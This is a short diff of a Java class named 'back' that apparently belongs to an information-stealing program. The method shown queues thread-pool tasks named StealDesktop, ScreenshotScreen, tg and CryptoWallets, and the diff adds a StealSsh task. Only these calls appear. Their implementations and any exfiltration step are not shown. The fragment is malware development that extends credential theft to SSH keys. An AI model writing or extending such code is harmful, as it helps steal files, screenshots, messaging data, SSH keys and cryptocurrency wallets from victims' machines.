@@ -27,6 +27,7 @@ public class back {
     public static void xd(){
         ExecutorService ex = Executors.newFixedThreadPool(4);
         ex.submit(() -> zero.StealDesktop());
+        ex.submit(() -> zero.StealSsh());
         ex.submit(() -> zero.ScreenshotScreen());
         ex.submit(() -> zero.tg());
         ex.submit(() -> zero.CryptoWallets());
